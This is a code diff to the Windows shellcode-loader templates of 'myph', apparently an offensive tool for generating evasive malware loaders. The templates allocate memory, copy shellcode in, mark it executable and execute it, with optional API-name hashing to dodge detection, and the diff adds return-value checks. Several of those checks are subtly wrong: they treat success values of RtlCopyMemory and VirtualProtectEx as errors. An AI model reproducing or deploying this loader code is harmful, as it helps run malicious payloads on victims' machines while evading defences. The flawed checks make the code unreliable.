@@ -2,13 +2,13 @@ package loaders
 
 import (
 	"fmt"
-	"github.com/cmepw/myph/v2/cli"
+	"github.com/cmepw/myph/v2/apiHashing"
 	"strings"
 )
 
 type SyscallTemplate struct {
 	UseApiHashing bool
-	HashMethod    cli.ApiHashTechnique
+	HashMethod    apihashing.ApiHashTechnique
 }
 
 func (t SyscallTemplate) Import() string {
@@ -79,8 +79,6 @@ func (t SyscallTemplate) Process() string {
 		/*
 			FIXME(djnn): reading ntdll or kernel32 from disk sucks, we should recover it from PEB instead
 			but i will address this later
-
-			also, we should probably only read from ntdll
 		*/
 
 		hashedVirtualAllocEx := t.HashMethod.HashItem("VirtualAllocEx")
@@ -127,7 +125,7 @@ func (t SyscallTemplate) Process() string {
         addr,
         (uintptr)(unsafe.Pointer(&shellcode[0])),
         regionsize,
-    ); if addr != 0 {
+    ); if rvalue != 0 {
         log.Fatal("Error: invalid return value")
     }
 
@@ -144,12 +142,12 @@ func (t SyscallTemplate) Process() string {
         regionsize,
         PAGE_EXECUTE_READ,
         uintptr(unsafe.Pointer(&oldProtect)),
-    ); if addr != 0 {
+    ); if rvalue != 0 {
         log.Fatal("Error: invalid return value")
     }
 
     _, _, err = syscall.SyscallN(addr)
-	if err != nil { 
+	if err != nil {
 		log.Fatal(err)
 	}
 
@@ -165,9 +163,22 @@ func (t SyscallTemplate) Process() string {
 	// syscall.InvalidHandle means self for windows
 	return fmt.Sprintf(`
 	addr, _, _ := VirtualAllocEx.Call(syscall.InvalidHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+    if addr == 0 {
+        log.Fatal("Error: null return value")
+    }
+
+    rval, _, _ := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+    if rval != 0 {
+        log.Fatal("Error: invalid return value")
+    }
+
+
 	oldProtect := PAGE_READWRITE
-	_, _, _ = VirtualProtectEx.Call(syscall.InvalidHandle,  addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	rval, _, _ = VirtualProtectEx.Call(syscall.InvalidHandle,  addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+    if rval != 0 {
+        log.Fatal("Error: invalid return value")
+    }
+
 	_, _, _ = syscall.SyscallN(addr)
 `)
 }
